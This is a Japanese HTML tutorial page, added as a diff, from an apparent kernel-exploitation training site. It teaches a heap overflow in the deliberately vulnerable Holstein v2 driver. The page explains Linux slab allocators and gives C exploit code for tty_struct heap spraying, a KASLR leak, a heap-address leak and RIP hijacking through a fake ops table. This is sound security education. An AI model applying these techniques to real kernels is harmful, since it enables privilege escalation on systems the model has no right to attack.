@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+
+
+
+
+
+<title>Holstein v2: Heap Overflowの悪用 | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+            
+                Holstein v2: Heap Overflowの悪用
+            
+            
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="stack_overflow.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="use_after_free.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>前章ではHolsteinモジュールのStack Overflowを悪用して権限昇格をしました。Holsteinモジュールの開発者はすぐさま脆弱性を修正し、Holstein v2を公開しました。本章では、改善されたHolsteinモジュールv2をexploitしていきます。</p>
+<div class="column" title="目次">
+<!-- toc -->
+<ul>
+<li><a href="#%E3%83%91%E3%83%83%E3%83%81%E3%81%AE%E8%A7%A3%E6%9E%90%E3%81%A8%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%AE%E8%AA%BF%E6%9F%BB">パッチの解析と脆弱性の調査</a></li>
+<li><a href="#%E3%82%B9%E3%83%A9%E3%83%96%E3%82%A2%E3%83%AD%E3%82%B1%E3%83%BC%E3%82%BF">スラブアロケータ</a>
+<ul>
+<li><a href="#slab%E3%82%A2%E3%83%AD%E3%82%B1%E3%83%BC%E3%82%BF">SLABアロケータ</a></li>
+<li><a href="#slub%E3%82%A2%E3%83%AD%E3%82%B1%E3%83%BC%E3%82%BF">SLUBアロケータ</a></li>
+<li><a href="#slob%E3%82%A2%E3%83%AD%E3%82%B1%E3%83%BC%E3%82%BF">SLOBアロケータ</a></li>
+</ul>
+</li>
+<li><a href="#heap-overflow%E3%81%AE%E6%82%AA%E7%94%A8">Heap Overflowの悪用</a></li>
+<li><a href="#rop%E3%81%AB%E3%82%88%E3%82%8Bexploit">ROPによるExploit</a>
+<ul>
+<li><a href="#%E3%83%92%E3%83%BC%E3%83%97%E3%82%AA%E3%83%BC%E3%83%90%E3%83%BC%E3%83%95%E3%83%AD%E3%83%BC%E3%81%AE%E7%A2%BA%E8%AA%8D">ヒープオーバーフローの確認</a></li>
+<li><a href="#kaslr%E3%81%AE%E5%9B%9E%E9%81%BF">KASLRの回避</a></li>
+<li><a href="#smap%E3%81%AE%E5%9B%9E%E9%81%BFrip%E3%81%AE%E5%88%B6%E5%BE%A1">SMAPの回避：RIPの制御</a></li>
+<li><a href="#smep%E3%81%AE%E5%9B%9E%E9%81%BFstack-pivot">SMEPの回避：Stack Pivot</a></li>
+<li><a href="#%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC">権限昇格</a></li>
+</ul>
+</li>
+<li><a href="#aaraaw%E3%81%AB%E3%82%88%E3%82%8Bexploit">AAR/AAWによるExploit</a>
+<ul>
+<li><a href="#modprobe_path%E3%81%A8core_pattern">modprobe_pathとcore_pattern</a></li>
+<li><a href="#cred%E6%A7%8B%E9%80%A0%E4%BD%93">cred構造体</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+<br>
+</div>
+<h2><span id="パッチの解析と脆弱性の調査">パッチの解析と脆弱性の調査</span></h2>
+<p>まずは<a href="distfiles/LK01-2.tar.gz">Holstein v2</a>をダウンロードしてください。<br>
+srcディレクトリにあるソースコードを確認すると、前回との差分は<code>module_read</code>と<code>module_write</code>の2箇所だけだと分かります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">module_read</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_read called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_to_user(buf, g_buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_to_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">module_write</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">                            <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">                            <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_write called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(g_buf, buf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_from_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>スタック変数を使わなくなった代わりに、<code>g_buf</code>の値を直接読み書き可能になりました。もちろん、相変わらずサイズチェックがないのでオーバーフローが存在します。今回の脆弱性はヒープオーバーフローとなります。<br>
+<code>g_buf</code>は<code>module_open</code>で確保されていました。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);</span><br></pre></td></tr></table></figure>
+<p><code>BUFFER_SIZE</code>は0x400です。それ以上の値を書き込むとどうなるか、試してみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;/dev/holstein&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x500</span>);</span><br><span class="line">  write(fd, buf, <span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>実際にプログラムを動かしても、次のように何も発生しないかと思います。</p>
+<center>
+  <img src="img/hbof_nothing.png" alt="ヒープオーバーフローでも落ちない" style="width:320px;">
+</center>
+<p>そもそもLinux Kernelのヒープはどのような仕組みになっているのでしょうか。</p>
+<h2><span id="スラブアロケータ">スラブアロケータ</span></h2>
+<p>カーネルでもユーザー空間同様に、ページサイズより小さい領域を動的に確保したい場合があります。最も簡単なアロケータはmmapのようにページサイズ単位で切り出す方法ですが、不要な領域が多くメモリリソースが無駄です。<br>
+ユーザー空間におけるmallocと同様に、カーネル空間にもkmallocが用意されています。これはカーネルに搭載されたアロケータを利用するのですが、主にSLAB, SLUB, SLOBのいずれかが使われています。3種類は完全に独立はしておらず、実装上共通の部分もあります。これら3つをまとめてスラブアロケータ（Slab allocator）と呼びます。表記上はSlabとSLABの差なので紛らわしいですね。</p>
+<p>これから各アロケータの実装を説明しますが、あくまでexploitで重要な箇所だけを抑えます。ユーザー空間のメモリアロケータ同様、exploitで重要になるのは次の点です。</p>
+<ul>
+<li>確保するサイズに応じてチャンクがどこから切り出されるか</li>
+<li>解放したオブジェクトがどのように管理され、後の確保で再利用されるか</li>
+</ul>
+<p>この2点を中心に各アロケータの実装を見ていきましょう。</p>
+<h3><span id="slabアロケータ">SLABアロケータ</span></h3>
+<p>SLABアロケータは、歴史的に最も古いタイプのアロケータです。Solarisなどで主に使われています。<br>
+主要な実装は<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/mm/slab.c">/mm/slab.c</a>で定義されています。</p>
+<p>SLABには次のような特徴があります。</p>
+<ul>
+<li><strong>サイズに応じたページフレームの使い分け</strong><br>
+libcのメモリアロケータとは違い、サイズ帯に応じて異なるページが確保されます。そのためチャンクの前後にはサイズ情報はありません。</li>
+<li><strong>キャッシュの利用</strong><br>
+小さいサイズについてはサイズ帯ごとのキャッシュが優先的に使われます。サイズが大きい場合やキャッシュが空の場合は通常の確保が使われます。</li>
+<li><strong>ビットマップ（index）を使った解放領域の管理</strong><br>
+サイズ帯に応じてページフレームが変わるため、ページ先頭に「そのページの中で特定のindexの領域が解放されているか」を表すビット配列があります。libcのmallocと違い、linked listでは管理していません。</li>
+</ul>
+<p>まとめると、解放領域は次のようにページフレームごとにインデクスで管理されます。</p>
+<center>
+  <img src="img/slab_allocator.png" alt="SLABアロケータの図" style="width:640px;">
+</center>
+<p>なお、実際にはキャッシュとしてエントリがいくつか存在し、そこに記載された解放済み領域のポインタが優先して使われます。<br>
+その他、<code>__kmem_cache_create</code>というキャッシュ生成時のフラグによって次のような機能があります。</p>
+<ul>
+<li><code>SLAB_POISON</code>: 解放された領域は0xA5で埋められます。</li>
+<li><code>SLAB_RED_ZONE</code>: オブジェクトの後ろにredzoneという領域が付加され、Heap Overflowなどで書き換えられると検知されます。</li>
+</ul>
+<h3><span id="slubアロケータ">SLUBアロケータ</span></h3>
+<p>SLUBアロケータは、現在デフォルトで使われているアロケータで、巨大なシステム向けです。なるべく高速になるよう設計されています。<br>
+主要な実装は<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/mm/slub.c">/mm/slub.c</a>で定義されています。</p>
+<p>SLUBには次のような特徴があります。</p>
+<ul>
+<li><strong>サイズに応じたページフレームの使い分け</strong><br>
+SLAB同様にサイズ帯に応じて使われるページフレームが変わります。例えば100バイトならkmalloc-128, 200バイトならkmalloc-256といったように専用の領域が使われます。SLABと異なりページフレームの先頭にメタデータ（解放領域のインデクスなど）はありません。freelistの先頭のポインタなどはページフレームディスクリプタに記載されています。</li>
+<li><strong>片方向リストを利用した解放領域の管理</strong><br>
+SLUBはlibcのtcacheやfastbinのように、片方向リストで解放領域を管理します。解放された領域の先頭には前に解放された領域へのポインタが書き込まれ、最後に解放された領域のリンクはNULLになります。tcacheやfastbinのような、リンクの書き換えをチェックするセキュリティ機構は特にありません。</li>
+<li><strong>キャシュの利用</strong><br>
+SLAB同様にCPUごとのキャッシュがありますが、こちらもSLUBでは片方向リストになっています。</li>
+</ul>
+<p>まとめると、解放領域は次のように片方向リストで管理されます。</p>
+<center>
+  <img src="img/slub_allocator.png" alt="SLUBアロケータの図" style="width:680px;">
+</center>
+<p>SLUBではカーネル起動時の<code>slub_debug</code>パラメータに文字を与えることでデバッグ用の機能を有効化できます。</p>
+<ul>
+<li>F: sanity checkを有効化します。</li>
+<li>P: 解放済み領域を特定のビット列で埋めます。</li>
+<li>U: 確保と解放のスタックトレースを記録します。</li>
+<li>T: 特定のスラブキャッシュの使用ログを取ります。</li>
+<li>Z: オブジェクトの後ろにredzoneを追加し、Heap Overflowを検知します。</li>
+</ul>
+<p>本章を含め、以降も攻撃対象のカーネルでは基本的にSLUBが使われています。しかし、すべてのプログラムがヒープを共有している以上、freelistを破壊するような攻撃は現実的にあまり成立しませんので、このサイトでは扱いません。今後学ぶ攻撃手法のほとんどが他のアロケータにも通用します。</p>
+<h3><span id="slobアロケータ">SLOBアロケータ</span></h3>
+<p>SLOBアロケータは、組み込みシステム向けのアロケータです。なるべく軽量になるよう設計されています。<br>
+主要な実装は<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/mm/slob.c">/mm/slob.c</a>で定義されています。</p>
+<p>SLOBアロケータには次のような特徴があります。</p>
+<ul>
+<li><strong>K&amp;Rアロケータ</strong><br>
+いわゆるglibc mallocのような、サイズに依存せず使える領域を先頭から切り出していく方式です。領域が足りなくなったら新しいページを確保します。そのため非常に断片化が起きやすいです。</li>
+<li><strong>オフセットによる解放領域の管理</strong><br>
+glibcではtcacheやfastbinのように解放領域をサイズごとにリストで管理しています。一方SLOBでは、サイズに関係なくすべての解放領域が順に繋がります。また、リストはポインタを持つのではなく、そのチャンクのサイズと次の解放領域へのオフセット情報を持ちます。これらの情報は解放済み領域の先頭に書き込まれます。確保する際にはこのリストを辿り、使えるサイズを見つけたら利用します。</li>
+<li><strong>サイズに応じたfreelist</strong><br>
+断片化を抑えるため、freeしたオブジェクトをサイズごとに繋げるリストがいくつか存在します。</li>
+</ul>
+<p>まとめると、解放領域は次のようにサイズとオフセットによる片方向リストで管理されます。（解放済み領域から出る矢印はポインタではなく、オフセット情報になっています。）</p>
+<center>
+  <img src="img/slob_allocator.png" alt="SLOBアロケータの図" style="width:680px;">
+</center>
+<h2><span id="heap-overflowの悪用">Heap Overflowの悪用</span></h2>
+<p>SLUBではサイズごとにページを使い分け、また片方向リストで解放済み領域を管理することを学びました。</p>
+<p><a href="../introduction/introduction.html">導入</a>の章でも説明しましたが、カーネルのヒープは全ドライバおよびカーネルで共有されています。したがって、1つのドライバの脆弱性を使ってカーネル空間の別のオブジェクトを破壊可能です。今回の脆弱性はHeap Overflowなので、悪用するにはオーバーフローする領域の後ろに、何かしら破壊したいオブジェクトが存在する必要があります。<br>
+Exploitに慣れている方ならすぐ思いつくでしょうが、そのためにはHeap Sprayが便利です。ここでは、Heap Sprayは次の2つの目的で使えます。</p>
+<ol>
+<li>既に存在するfreelistを使い果たす<br>
+freelistからオブジェクトが確保されてしまうと、破壊したいオブジェクトが隣り合う保証がありません。そのため、対象のサイズ帯のfreelistをあらかじめ消費する必要があります。</li>
+<li>オブジェクトを隣り合わせる<br>
+freelistを消費した時点でオブジェクトが隣り合う可能性は高いですが、アロケータによってはページを前から消費していくか後ろから消費していくか分からないので、とにかくHeap Overflowのあるオブジェクトの前後を破壊したいオブジェクトで埋めます。</li>
+</ol>
+<p>次に問題になるのがオブジェクトのサイズです。あらためてHolsteinのソースコードを見ると、確保されるバッファのサイズは0x400であることが分かります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 0x400</span></span><br></pre></td></tr></table></figure>
+<p>0x400はkmalloc-1024に相当します。（システムのslabの情報は<code>/proc/slabinfo</code>から見られます。）<br>
+したがって、破壊できるオブジェクトも基本的にはサイズ0x400のものになります。攻撃の観点から<a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">使えるオブジェクトをサイズごとにまとめた記事</a>を以前書いたので、そちらを参照してください。<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
+<p>今回のkmalloc-1024では<code>tty_struct</code>という構造体が使えそうです。<code>tty_struct</code>は<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143"><code>tty.h</code></a>で定義されており、TTYに関する状態を保持するための構造体です。この構造体のサイズはkmalloc-1024に相当するため、今回の脆弱性で範囲外読み書きができます。構造体のメンバを見てみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>	<span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>ここで<code>tty_operations</code>は、そのTTYに対する操作を定義する関数テーブルになっています。<br>
+次のようにプログラムから<code>/dev/ptmx</code>を開くことでカーネル空間に<code>tty_struct</code>が確保されます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ptmx = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br></pre></td></tr></table></figure>
+<p>これに対して<code>read</code>, <code>write</code>や<code>ioctl</code>等の操作を呼び出すと、<code>tty_operations</code>に記載された関数ポインタが呼ばれます。</p>
+<h2><span id="ropによるexploit">ROPによるExploit</span></h2>
+<p>必要な知識はすべて揃ったので、権限昇格するexploitを書いていきましょう。</p>
+<h3><span id="ヒープオーバーフローの確認">ヒープオーバーフローの確認</span></h3>
+<p>まずはgdbを使ってヒープオーバーフローが起きていることを確認しましょう。同時にHeap Sprayも確認するため、次のようなコードを書きました。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> spray[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">    spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>)</span><br><span class="line">      fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 周囲にtty_structがある位置に確保させる</span></span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/holstein&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    fatal(<span class="string">&quot;/dev/holstein&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">50</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    spray[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">    <span class="keyword">if</span> (spray[i] == <span class="number">-1</span>)</span><br><span class="line">      fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Heap Buffer Overflow</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x500</span>);</span><br><span class="line">  write(fd, buf, <span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">  getchar(); <span class="comment">// 止める</span></span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>いつもどおりKASLRを切って<code>/proc/modules</code>を確認し、gdbでアタッチして<code>write</code>ハンドラのあたりでブレークポイントを付けてみましょう。<code>g_buf</code>のアドレスを知りたいので以下の命令の直後にブレークポイントを付けてみました。</p>
+<center>
+  <img src="img/ida_holstein2_write.png" alt="ブレークポイントを設置する場所" style="width:320px;">
+</center>
+<p>ブレークポイントでバッファとその周辺を確認すると、次のように似た構造のオブジェクトが周囲に存在することが分かります。</p>
+<center>
+  <img src="img/gdb_spray.png" alt="gdbによるHeap Sprayの確認" style="width:640px;">
+</center>
+<p>これこそsprayした<code>tty_struct</code>構造体で、今回はこのオブジェクトをHeap Buffer Overflowで破壊することにより、権限昇格するexploitを書きます。Heap Overflowが発生した後の様子を見ると、次のように<code>g_buf</code>の直後にある<code>tty_struct</code>が破壊されていることが分かります。</p>
+<center>
+  <img src="img/gdb_tty_bof.png" alt="tty_structの破壊" style="width:640px;">
+</center>
+<h3><span id="kaslrの回避">KASLRの回避</span></h3>
+<p>Holstein v1ではセキュリティ機構を1つずつ回避していきましたが、今回は一気にすべてのセキュリティ機構（KASLR, SMAP, SMEP, KPTI）を回避しましょう。（当然デバッグの際はKASLRを無効にしてください。）</p>
+<p>さて、今回のHeap Buffer Overflowは書き込みだけでなく読み込みもできるため、<code>tty_struct</code>を読むことでKASLRの回避が可能です。例えば<code>tty_struct</code>を確認したときの図で、先頭から0x18バイトにあるポインタ（<code>ops</code>）は明らかにカーネル空間のアドレスなので、ここからベースアドレスが計算できます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ofs_tty_ops 0xc38880</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kbase;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// KASLRの回避</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line">  read(fd, buf, <span class="number">0x500</span>);</span><br><span class="line">  kbase = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x418</span>] - ofs_tty_ops;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kbase = 0x%016lx\n&quot;</span>, kbase);</span><br></pre></td></tr></table></figure>
+<h3><span id="smapの回避ripの制御">SMAPの回避：RIPの制御</span></h3>
+<p>カーネルのベースアドレスが分かり、<code>ops</code>という関数テーブルを書き換えればRIPも制御できそうです。しかし、実際にはそう簡単ではありません。<code>ops</code>は関数ポインタではなく関数テーブルなので、RIPを制御するためには偽の関数テーブルを指す必要があります。<br>
+もしSMAPが無効ならユーザー空間に偽の関数テーブルを用意して、そのポインタを<code>ops</code>に書き込めば成功します。しかし、今回SMAPが有効なのでユーザー空間のデータは参照できません。</p>
+<p>ではどのようにSMAPを回避するのでしょうか？<br>
+我々がカーネル空間にデータを書き込めるのはヒープですので、ヒープのアドレスをリークする必要があります。gdbで<code>tty_struct</code>を見てみると、いくつかヒープのアドレスらしきポインタが確認できます。</p>
+<center>
+  <img src="img/gdb_tty_struct.png" alt="tty_structの様子" style="width:640px;">
+</center>
+<p>特にオフセット0x38あたりのポインタは、まさにこの<code>tty_struct</code>の中を指しています<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>。このポインタから<code>tty_struct</code>のアドレスや、そこから0x400を引けば<code>g_buf</code>のアドレスが計算できます。<code>g_buf</code>の内容は操作可能なので、ここに関数テーブル<code>ops</code>を設置して、Heap Overflowで<code>ops</code>を書き換えます。<br>
+書き換えられた<code>tty_struct</code>に対して適当な操作をすればRIPが制御できますが、どの<code>tty_struct</code>か分からないのでsprayしたすべてのFDに操作をしましょう。また、呼び出される関数ポインタの位置が分からないので、適当な関数テーブルを作り、呼び出される関数ポインタの位置をクラッシュメッセージから特定します。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// g_bufのアドレスリーク</span></span><br><span class="line">g_buf = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x438</span>] - <span class="number">0x438</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] g_buf = 0x%016lx\n&quot;</span>, g_buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 偽関数テーブルの書き込み</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">  *p++ = <span class="number">0xffffffffdead0000</span> + (i &lt;&lt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x418</span>] = g_buf;</span><br><span class="line">write(fd, buf, <span class="number">0x420</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// RIPの制御</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  ioctl(spray[i], <span class="number">0xdeadbeef</span>, <span class="number">0xcafebabe</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>次のようにRIPが取れていれば成功です。</p>
+<center>
+  <img src="img/crash_ioctl.png" alt="tty_structの書き換えでRIPが制御できている" style="width:720px;">
+</center>
